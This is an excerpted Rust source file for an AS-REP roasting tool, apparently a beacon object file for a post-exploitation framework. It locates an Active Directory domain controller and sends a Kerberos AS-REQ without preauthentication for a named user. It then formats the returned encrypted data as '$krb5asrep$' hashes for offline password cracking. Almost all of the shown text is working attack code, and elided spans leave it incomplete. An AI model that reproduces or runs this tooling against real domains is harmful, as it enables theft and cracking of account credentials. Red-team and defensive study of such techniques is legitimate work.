...
fn asn_tag_len(tag: u8, data: &[u8]) -> Vec<u8> {
    ...
    else if l < 0x100 { out.push(0x81); out.push(l as u8); }
...
fn asn_int(v: i64) -> Vec<u8> {
    ...
    let mut b = Vec::new();
    let mut val = v;
    if v > 0 { while val > 0 { b.push((val & 0xff) as u8); val >>= 8; } b.reverse(); if b[0] & 0x80 != 0 { b.insert(0, 0); } }
    else { while val < -1 { b.push((val & 0xff) as u8); val >>= 8; } b.push((val & 0xff) as u8); b.reverse(); }
    let mut out = vec![0x02, b.len() as u8]; out.extend_from_slice(&b); out
}
...
fn parse_one(data: &[u8], mut pos: usize) -> Option<(Asn, usize)> {
    ...
    let class = (b >> 6) & 0x03; let constructed = (b & 0x20) != 0;
    let mut tag = (b & 0x1F) as u32;
    if tag == 0x1F { tag = 0; loop { if pos >= data.len() { return None; } let b = data[pos]; pos += 1; tag = (tag << 7) | (b & 0x7F) as u32; if b & 0x80 == 0 { break; } } }
    if pos >= data.len() { return None; }
    let lb = data[pos]; pos += 1;
    let length = if lb < 0x80 { lb as usize } else if lb == 0x80 { return None; } else { let n = (lb & 0x7F) as usize; if pos + n > data.len() { return None; } let mut l = 0; for i in 0..n { l = (l << 8) | data[pos + i] as usize; } pos += n; l };
...
fn get_param<'a>(params: &'a str, name: &str) -> Option<&'a str> {
    if let Some(pos) = params.find(name) { let a = &params[pos + name.len()..]; let e = a.find(' ').unwrap_or(a.len()); let v = &a[..e]; if !v.is_empty() { return Some(v); } } None
}
...
fn send_to_kdc(server: &str, data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        ...
        sc.extend_from_slice(server.as_bytes()); sc.push(0);
        let mut hints = core::mem::zeroed::<ADDRINFOA>();
        hints.ai_family = AF_INET as i32; hints.ai_socktype = SOCK_STREAM as i32; hints.ai_protocol = IPPROTO_TCP as i32;
...
fn get_domain_info() -> Option<(String, String)> {
    unsafe {
        ...
        #[repr(C)] struct DcInfo { dc_name: *mut u8, dc_addr: *mut u8, dc_addr_type: u32, guid: [u8; 16], domain: *mut u8, forest: *mut u8, flags: u32, site: *mut u8, client_site: *mut u8 }
        type DsGetDcFn = unsafe extern "system" fn(*const u8, *const u8, *const c_void, *const u8, u32, *mut *mut DcInfo) -> u32;
        type FreeFn = unsafe extern "system" fn(*mut c_void) -> u32;
        let ds: DsGetDcFn = core::mem::transmute(GetProcAddress(netapi, b"DsGetDcNameA\0".as_ptr()));
        let fr: FreeFn = core::mem::transmute(GetProcAddress(netapi, b"NetApiBufferFree\0".as_ptr()));
        ...
        let domain = cstr_to_string((*info).domain); let dc = cstr_to_string((*info).dc_name);
        fr(info as *mut c_void);
        Some((domain, String::from(dc.trim_start_matches('\\'))))
    }
}

fn cstr_to_string(ptr: *const u8) -> String { if ptr.is_null() { return String::new(); } unsafe { let mut l = 0; while *ptr.add(l) != 0 { l += 1; } String::from_utf8_lossy(core::slice::from_raw_parts(ptr, l)).into_owned() } }
...
unsafe extern "system" { fn GetSystemTime(st: *mut SYSTEMTIME); }
...
fn build_asrep_req(user: &str, domain: &str) -> Vec<u8> {
    ...
    let sname = asn_seq(&[&asn_ctx_int(0, 2), &asn_ctx(1, &asn_seq(&[&asn_str("krbtgt"), &asn_str(domain)]))]);
    let till = get_future_time(24);
    let etypes = asn_seq(&[&asn_int(23), &asn_int(18), &asn_int(17)]);
    let pac = asn_seq(&[&asn_ctx_int(1, 128), &asn_ctx(2, &asn_oct(&[0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0x01]))]);
...
fn extract_asrep_hash(response: &[u8], user: &str, domain: &str) -> Option<String> {
    ...
    if root.tag == 30 {
        ...
        if let Some(err) = find_ctx(body, 6) {
            if let Some(code) = err.children.first() {
                let c = get_int(code);
                match c {
                    6 => { eprintln!("[X] KDC_ERR_C_PRINCIPAL_UNKNOWN - user '{}' not found", user); }
                    25 => { eprintln!("[X] KDC_ERR_PREAUTH_REQUIRED - user '{}' has pre-auth enabled", user); }
                    _ => { eprintln!("[X] Kerberos error: {}", c); }
                }
            }
        }
        return None;
    ...
    if root.tag != 11 { eprintln!("[X] Unexpected response tag: {}", root.tag); return None; }
    ...
    if etype == 23 {
        ...
        Some(alloc::format!("$krb5asrep$23${}@{}:{}${}", user, domain.to_ascii_uppercase(), checksum, rest))
    } else if etype == 18 {
        let checksum = bytes_to_hex(&cipher[cipher.len().saturating_sub(12)..]);
        let rest = bytes_to_hex(&cipher[..cipher.len().saturating_sub(12)]);
        Some(alloc::format!("$krb5asrep$18${}@{}:{}${}", user, domain.to_ascii_uppercase(), checksum, rest))
    } else if etype == 17 {
        let checksum = bytes_to_hex(&cipher[cipher.len().saturating_sub(12)..]);
        let rest = bytes_to_hex(&cipher[..cipher.len().saturating_sub(12)]);
        Some(alloc::format!("$krb5asrep$17${}@{}:{}${}", user, domain.to_ascii_uppercase(), checksum, rest))
    } else {
...
fn main(args: *mut u8, len: usize) {
    ...
    if len == 0 { eprintln!("[X] /user:X required"); return; }

    let mut parser = DataParser::new(args, len);
    let params = String::from(parser.get_str());

    let user = match get_param(&params, "/user:") { Some(u) => u, None => { eprintln!("[X] /user:X must be supplied!"); return; } };
    ...
    let (domain, dc) = if let (Some(d), Some(c)) = (domain_arg, dc_arg) {
        ...
        match get_domain_info() {
            ...
            None => { eprintln!("[X] Could not retrieve domain info! Use /domain: and /dc:"); return; }
        }
    };

    println!("[*] Building AS-REQ (w/o preauth) for: '{}\\{}'", domain, user);
    ...
    match extract_asrep_hash(&response, user, &domain) {
        Some(hash) => {
            println!("[+] AS-REP hash:\n\n{}\n", hash);
        }
        None => {}
